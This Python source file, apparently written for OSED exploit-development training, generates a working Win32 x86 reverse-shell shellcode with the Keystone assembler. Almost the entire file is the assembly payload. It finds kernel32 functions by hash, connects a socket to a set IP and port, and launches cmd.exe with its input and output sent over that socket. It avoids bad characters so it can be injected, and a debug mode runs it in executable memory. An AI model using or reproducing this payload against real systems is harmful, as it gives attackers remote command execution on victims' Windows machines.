"""
    Win32 Shellcoder for OSED Exploit Development
    ██████  ███▄    █  ▒█████   █     █░ ▄████▄   ██▀███   ▄▄▄        ██████  ██░ ██
  ▒██    ▒  ██ ▀█   █ ▒██▒  ██▒▓█░ █ ░█░▒██▀ ▀█  ▓██ ▒ ██▒▒████▄    ▒██    ▒ ▓██░ ██▒
  ░ ▓██▄   ▓██  ▀█ ██▒▒██░  ██▒▒█░ █ ░█ ▒▓█    ▄ ▓██ ░▄█ ▒▒██  ▀█▄  ░ ▓██▄   ▒██▀▀██░
    ▒   ██▒▓██▒  ▐▌██▒▒██   ██░░█░ █ ░█ ▒▓▓▄ ▄██▒▒██▀▀█▄  ░██▄▄▄▄██   ▒   ██▒░▓█ ░██
  ▒██████▒▒▒██░   ▓██░░ ████▓▒░░░██▒██▓ ▒ ▓███▀ ░░██▓ ▒██▒ ▓█   ▓██▒▒██████▒▒░▓█▒░██▓
  ▒ ▒▓▒ ▒ ░░ ▒░   ▒ ▒ ░ ▒░▒░▒░ ░ ▓░▒ ▒  ░ ░▒ ▒  ░░ ▒▓ ░▒▓░ ▒▒   ▓▒█░▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒
  ░ ░▒  ░ ░░ ░░   ░ ▒░  ░ ▒ ▒░   ▒ ░ ░    ░  ▒     ░▒ ░ ▒░  ▒   ▒▒ ░░ ░▒  ░ ░ ▒ ░▒░ ░
  ░  ░  ░     ░   ░ ░ ░ ░ ░ ▒    ░   ░  ░          ░░   ░   ░   ▒   ░  ░  ░   ░  ░░ ░
        ░           ░     ░ ░      ░    ░ ░         ░           ░  ░      ░   ░  ░  ░
                                    Written by: snowcra5h@icloud.com (snowcra5h) 2023

A good resource for replacing bad chars https://defuse.ca/online-x86-assembler.htm#disassembly2
"""

import ctypes, struct, numpy # pip install keystone-engine numpy
from keystone import *

class Sin:
    def __init__(self, ip=None, port=None):
        self.ip = ip
        self.port = port
        self.__sin_addr = ""
        self.__sin_port = ""

        if self.ip and self.port:
            self.__to_sin_addr()
            self.__to_sin_port()

    def __to_sin_addr(self):
        sin_addr = []
        for block in self.ip.split("."):
            sin_addr.append(format(int(block), "02x"))
        sin_addr.reverse()
        self.__sin_addr = "0x" + "".join(sin_addr)

    def __to_sin_port(self):
        sin_port = format(int(self.port), "04x")
        self.__sin_port = "0x" + str(sin_port[2:4]) + str(sin_port[0:2])

    def get_sin_addr(self) -> str:
        return self.__sin_addr

    def get_sin_port(self) -> str:
        return self.__sin_port

class ShellCode:

    def __init__(self, ip, port):
        self.__sin = Sin(ip, port)
        self.__sin_addr = self.__sin.get_sin_addr()
        self.__sin_port = self.__sin.get_sin_port()

    def __ror_str(self, byte, count):
        binb = numpy.base_repr(byte, 2).zfill(32)
        while count > 0:
            binb = binb[-1] + binb[0:-1]
            count -= 1
        return (int(binb, 2))

    def __get_hash(self, esi):
        edx = 0x00
        ror_count = 0

        for eax in esi:
            edx = edx + ord(eax)
            if ror_count < len(esi)-1:
                edx = self.__ror_str(edx, 0xd)
            ror_count += 1

        return edx

    def get_reverse_shell(self, debug=False) -> str:
        # kernel32.dll
        TerminateProcess = self.__get_hash("TerminateProcess")
        LoadLibraryA     = self.__get_hash("LoadLibraryA")
        CreateProcessA   = self.__get_hash("CreateProcessA")

        # ws2_32.dll
        WSAStartup = self.__get_hash("WSAStartup")
        WSASocketA = self.__get_hash("WSASocketA")
        WSAConnect = self.__get_hash("WSAConnect")

        if debug:
            int3 = "int3"
        else: 
            int3 = ""

        asm = [
            " start:                                 ",
           f"   {int3}                              ;",  #  debug
            "   mov   ebp, esp                      ;",
            "   add   esp, 0xfffff9f0               ;",  #   Avoid NULL bytes

            " find_kernel32:                         ",
            "   xor   ecx, ecx                      ;",  #   ECX = 0
            "   mov   esi,fs:[ecx+30h]              ;",  #   ESI = &(PEB) ([FS:0x30])
            "   mov   esi,[esi+0Ch]                 ;",  #   ESI = PEB->Ldr
            "   mov   esi,[esi+1Ch]                 ;",  #   ESI = PEB->Ldr.InInitOrder

            " next_module:                           ",  #
            "   mov   ebx, [esi+8h]                 ;",  #   EBX = InInitOrder[X].base_address
            "   mov   edi, [esi+20h]                ;",  #   EDI = InInitOrder[X].module_name
            "   mov   esi, [esi]                    ;",  #   ESI = InInitOrder[X].flink (next)
            "   cmp   [edi+12*2], cx                ;",  #   (unicode) modulename[12] == 0x00? modulename[12] of kernel32.dll)
            "   jne   next_module                   ;",  #   No: try next module.

            " find_function_shorten:                 ",  #
            "   je find_function_shorten_bnc        ;",  #  jump if ECX == 0

            " find_function_ret:                     ",  #
            "   pop esi                             ;",  #   POP the return address from the stack
            "   mov   [ebp+0x04], esi               ;",  #   Save find_function address for later usage
            "   je resolve_symbols_kernel32         ;",  #

            " find_function_shorten_bnc:             ",  #   
            "   call find_function_ret              ;",  #   Relative CALL with negative offset

            " find_function:                         ",  #
            "   pushad                              ;",  #   Save all registers. Base address of kernel32 is in EBX from (find_kernel32)
            "   mov   eax, [ebx+0x3c]               ;",  #   Offset to PE Signature
            "   mov   edi, [ebx+eax+0x78]           ;",  #   Export Table Directory RVA
            "   add   edi, ebx                      ;",  #   Export Table Directory VMA
            "   mov   ecx, [edi+0x18]               ;",  #   NumberOfNames
            "   mov   eax, [edi+0x20]               ;",  #   AddressOfNames RVA
            "   add   eax, ebx                      ;",  #   AddressOfNames VMA
            "   mov   [ebp-4], eax                  ;",  #   Save AddressOfNames VMA for later

            " find_function_loop:                    ",  #
            "   jecxz find_function_finished        ;",  #   Jump to the end if ECX is 0
            "   dec   ecx                           ;",  #   Decrement our names counter
            "   mov   eax, [ebp-4]                  ;",  #   Restore AddressOfNames VMA
            "   mov   esi, [eax+ecx*4]              ;",  #   Get the RVA of the symbol name
            "   add   esi, ebx                      ;",  #   Set ESI to the VMA of the current symbol name

            " compute_hash:                          ",  #
            "   xor   eax, eax                      ;",  #   NULL EAX
            "   cdq                                 ;",  #   NULL EDX
            "   cld                                 ;",  #   Clear direction

            " compute_hash_again:                    ",  #
            "   lodsb                               ;",  #   Load the next byte from esi into al
            "   test  al, al                        ;",  #   Check for NULL terminator
            "   jz    compute_hash_finished         ;",  #   If the ZF is set, we've hit the NULL term
            # start of replace bad chars for 0x0d
            "   push  eax                           ;",  #   Save EAX
            "   push  ecx                           ;",  #   Save ECX
            "   xor   ecx, ecx                      ;",  #   NULL ECX
            "   add   cl, 0x06                      ;",  #   ECX = 6
            "   add   cl, 0x07                      ;",  #   ECX = 13 (0x0d)
            "   ror   edx, cl                       ;",  #   rotate right by 13
            "   pop   ecx                           ;",  #   restore eax
            "   pop   eax                           ;",  #   restore ecx
            # end of replace bad chars for 0x0d
#           "   ror   edx, 0x0d                     ;",  #   (bad chars 0d) Rotate edx 13 bits to the right
            "   add   edx, eax                      ;",  #   Add the new byte to the accumulator
            "   jne   compute_hash_again            ;",  #   Next iteration

            " compute_hash_finished:                 ",  #
            " find_function_compare:                 ",  #
            "   cmp   edx, [esp+0x24]               ;",  #   Compare the computed hash with the requested hash
            "   jnz   find_function_loop            ;",  #   If it doesn't match go back to find_function_loop
            "   mov   edx, [edi+0x24]               ;",  #   AddressOfNameOrdinals RVA
            "   add   edx, ebx                      ;",  #   AddressOfNameOrdinals VMA
            "   mov   cx,  [edx+2*ecx]              ;",  #   Extrapolate the function's ordinal
            "   mov   edx, [edi+0x1c]               ;",  #   AddressOfFunctions RVA
            "   add   edx, ebx                      ;",  #   AddressOfFunctions VMA
            "   mov   eax, [edx+4*ecx]              ;",  #   Get the function RVA
            "   add   eax, ebx                      ;",  #   Get the function VMA
            "   mov   [esp+0x1c], eax               ;",  #   Overwrite stack version of eax from pushad

            " find_function_finished:                ",  #
            "   popad                               ;",  #   Restore registers
            "   ret                                 ;",  #

            " resolve_symbols_kernel32:              ",
           f"   push  {TerminateProcess}            ;",  #   TerminateProcess hash
            "   call  dword ptr [ebp+0x04]          ;",  #   Call find_function
            "   mov   [ebp+0x10], eax               ;",  #   Save TerminateProcess address for later usage
    
           f"   push  {LoadLibraryA}                ;",  #   LoadLibraryA hash
            "   call  dword ptr [ebp+0x04]          ;",  #   Call find_function
            "   mov   [ebp+0x14], eax               ;",  #   Save LoadLibraryA address for later usage
    
           f"   push  {CreateProcessA}              ;",  #   CreateProcessA hash
            "   call  dword ptr [ebp+0x04]          ;",  #   Call find_function
            "   mov   [ebp+0x18], eax               ;",  #   Save CreateProcessA address for later usage

            " load_ws2_32:                           ",  #
            "   xor   eax, eax                      ;",  #   Null EAX
            "   mov   ax, 0x6c6c                    ;",  #   Move the end of the string in AX;
            "   push  eax                           ;",  #   Push \0\0ll on the stack
            "   push  0x642e3233                    ;",  #   Push d.23 on the stack
            "   push  0x5f327377                    ;",  #   Push _2sw on the stack
            "   push  esp                           ;",  #   Push ESP to have a pointer to the string
            "   call  dword ptr [ebp+0x14]          ;",  #   Call EAX = LoadLibrary(TEXT("ws2_32.dll")); 
            "   mov   ebx, eax                      ;",  #   Move the base address of ws2_32.dll to EBX

            " resolve_symbols_ws2_32:                ",  #   proceed into the resolve_symbols_ws2_32 function
           f"   push  {WSAStartup}                  ;",  #   WSAStartup hash
            "   call  dword ptr [ebp+0x04]          ;",  #   Call find_function
            "   mov   [ebp+0x1C], eax               ;",  #   Save WSAStartup address for later usage

            " resolve_symbols_WSASocketA:            ",  
           f"   push  {WSASocketA}                  ;",  #   WSASocketA hash
            "   call  dword ptr [ebp+0x04]          ;",  #   Call find_function
            "   mov   [ebp+0x20], eax               ;",  #   Save WSASocketA address for later usage

            " resolve_symbols_WSAConnect:            ",
           f"   push  {WSAConnect}                  ;",  #   WSAConnect hash
            "   call  dword ptr [ebp+0x04]          ;",  #   Call find_function
            "   mov   [ebp+0x24], eax               ;",  #   Save WSAConnect address for later usage

            " call_WSAStartup:                       ",  #
            "   mov   eax, esp                      ;",  #   Move ESP to EAX; eax = &esp
            "   mov   cx, 0x590                     ;",  #   Move 0x590 to CX; 
            "   sub   eax, ecx                      ;",  #   Subtract CX from EAX to avoid overwriting the structure later; 
                                                         #   because the space gets populated by the lpWSAData struct
            "   push  eax                           ;",  #   Push lpWSAData
            "   xor   eax, eax                      ;",  #   Null EAX
            "   mov   ax, 0x0202                    ;",  #   Move version to AX
            "   push  eax                           ;",  #   Push wVersionRequired
            "   call dword ptr [ebp+0x1C]           ;",  #   Call WSAStartup

            " call_WSASocketA:                       ",  #
            "   xor   eax, eax                      ;",  #   Null EAX
            "   push  eax                           ;",  #   Push dwFlags
            "   push  eax                           ;",  #   Push g
            "   push  eax                           ;",  #   Push lpProtocolInfo
            "   mov   al, 0x06                      ;",  #   Move AL, IPPROTO_TCP
            "   push  eax                           ;",  #   Push protocol
            "   sub   al, 0x05                      ;",  #   Subtract 0x05 from AL, AL = 0x01
            "   push  eax                           ;",  #   Push type
            "   inc   eax                           ;",  #   Increase EAX, EAX = 0x02
            "   push  eax                           ;",  #   Push af
            "   call dword ptr [ebp+0x20]           ;",  #   Call WSASocketA; returns descriptor or -1 in EAX
    
            " call_wsaconnect:                       ",  #
            "   mov   esi, eax                      ;",  #   Move the SOCKET descriptor to ESI
            "   xor   eax, eax                      ;",  #   Null EAX
            "   push  eax                           ;",  #   Push sin_zero[]
            "   push  eax                           ;",  #   Push sin_zero[]
                                                         
           f"   push  {self.__sin_addr}             ;",  #   Push sin_addr 
           f"   mov   ax, {self.__sin_port}         ;",  #   Move the sin_port to AX
            "   shl   eax, 0x10                     ;",  #   Left shift EAX by 0x10 bits
            "   add   ax, 0x02                      ;",  #   Add 0x02 (AF_INET) to AX
            "   push  eax                           ;",  #   Push sin_port & sin_family
            "   push  esp                           ;",  #   Push pointer to the sockaddr_in structure
            "   pop   edi                           ;",  #   Store pointer to sockaddr_in in EDI
            "   xor   eax, eax                      ;",  #   Null EAX
            "   push  eax                           ;",  #   Push lpGQOS
            "   push  eax                           ;",  #   Push lpSQOS
            "   push  eax                           ;",  #   Push lpCalleeData
            "   push  eax                           ;",  #   Push lpCallerData
            "   add   al, 0x10                      ;",  #   Set AL to 0x10
            "   push  eax                           ;",  #   Push namelen
            "   push  edi                           ;",  #   Push *name
            "   push  esi                           ;",  #   Push s
            "   call dword ptr [ebp+0x24]           ;",  #   Call WSAConnect

            " create_startupinfoa:                   ",  #   Push the ESI register, holds our socket descriptor, three times
            "   push  esi                           ;",  #   Push hStdError  ; basically does dup2
            "   push  esi                           ;",  #   Push hStdOutput ; 
            "   push  esi                           ;",  #   Push hStdInput  ; 
            "   xor   eax, eax                      ;",  #   Null EAX   
            "   push  eax                           ;",  #   Push lpReserved2
            "   push  eax                           ;",  #   Push cbReserved2 & wShowWindow
            "   mov   al, 0x80                      ;",  #   Move 0x80 to AL
            "   xor   ecx, ecx                      ;",  #   Null ECX
            "   mov   cl, 0x80                      ;",  #   Move 0x80 to CL
            "   add   eax, ecx                      ;",  #   Set EAX to 0x100
            "   push  eax                           ;",  #   Push dwFlags
            "   xor   eax, eax                      ;",  #   Null EAX   
            "   push  eax                           ;",  #   Push dwFillAttribute
            "   push  eax                           ;",  #   Push dwYCountChars
            "   push  eax                           ;",  #   Push dwXCountChars
            "   push  eax                           ;",  #   Push dwYSize
            "   push  eax                           ;",  #   Push dwXSize
            "   push  eax                           ;",  #   Push dwY
            "   push  eax                           ;",  #   Push dwX
            "   push  eax                           ;",  #   Push lpTitle
            "   push  eax                           ;",  #   Push lpDesktop
            "   push  eax                           ;",  #   Push lpReserved
            "   mov   al, 0x44                      ;",  #   Move 0x44 to AL; ?? sizeof(STARTUPINFOA) = 0x44 bytes;
            "   push  eax                           ;",  #   Push cb
            "   push  esp                           ;",  #   Push pointer to the STARTUPINFOA structure
            "   pop   edi                           ;",  #   Store pointer to STARTUPINFOA in EDI

            " create_cmd_string:                     ",  #
            "   mov   eax, 0xff9a879b               ;",  #   Move 0xff9a879b into EAX ; 'exe'
            "   neg   eax                           ;",  #   Negate EAX, EAX = 00657865; '.dmc'
            "   push  eax                           ;",  #   Push part of the "cmd.exe" string
            "   push  0x2e646d63                    ;",  #   Push the remainder of the "cmd.exe" string
            "   push  esp                           ;",  #   Push pointer to the "cmd.exe" string
            "   pop   ebx                           ;",  #   Store pointer to the "cmd.exe" string in EBX

            " call_createprocessa:                   ",  #
            "   mov   eax, esp                      ;",  #   Move ESP to EAX
            "   xor   ecx, ecx                      ;",  #   Null ECX
            "   mov   cx, 0x390                     ;",  #   Move 0x390 to CX
            "   sub   eax, ecx                      ;",  #   Subtract CX from EAX to avoid overwriting the structure later
            "   push  eax                           ;",  #   Push lpProcessInformation
            "   push  edi                           ;",  #   Push lpStartupInfo
            "   xor   eax, eax                      ;",  #   Null EAX
            "   push  eax                           ;",  #   Push lpCurrentDirectory
            "   push  eax                           ;",  #   Push lpEnvironment
            "   push  eax                           ;",  #   Push dwCreationFlags
            "   inc   eax                           ;",  #   Increase EAX, EAX = 0x01 (TRUE)
            "   push  eax                           ;",  #   Push bInheritHandles
            "   dec   eax                           ;",  #   Null EAX
            "   push  eax                           ;",  #   Push lpThreadAttributes
            "   push  eax                           ;",  #   Push lpProcessAttributes
            "   push  ebx                           ;",  #   Push lpCommandLine
            "   push  eax                           ;",  #   Push lpApplicationName
            "   call dword ptr [ebp+0x18]           ;",  #   Call CreateProcessA

            " call_terminate_process:                ",  #
            "   xor   ecx, ecx                      ;",  #   Null ECX
            "   push  ecx                           ;",  #   uExitCode
            "   push  0xffffffff                    ;",  #   hProcess
            "   call dword ptr [ebp+0x10]           ;",  #   Call TerminateProcess
        ]
        return "\n".join(asm)

def get_shellcode(ip: str, port: str, sc_type:str = None, debug = False) -> bytes:

    sc_type = sc_type   # nop

    sc = ShellCode(ip, port)
    shellcode = sc.get_reverse_shell(debug)

    ks = Ks(KS_ARCH_X86, KS_MODE_32)

    encoding, count = ks.asm(shellcode)
    print(f"[+] Encoded {count} Shellcode Instructions")
    print(encoding)

    sh = b""
    for e in encoding:
        sh += struct.pack("B", e)

    shellcode = bytearray(sh)

    if debug:
        ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                ctypes.c_int(len(shellcode)),
                ctypes.c_int(0x3000),
                ctypes.c_int(0x40)
        )

        buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)

        ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
                                             buf,
                                             ctypes.c_int(len(shellcode)))

        print("Shellcode located at address %s" % hex(ptr))
        input("...ENTER TO EXECUTE SHELLCODE...")

        ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                                 ctypes.c_int(0),
                                                 ctypes.c_int(ptr),
                                                 ctypes.c_int(0),
                                                 ctypes.c_int(0),
                                                 ctypes.pointer(ctypes.c_int(0)))

        ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))

    return sh

def main():
    get_shellcode(ip="192.168.45.167", port="4444", debug=True)

if __name__ == "__main__":
    main()
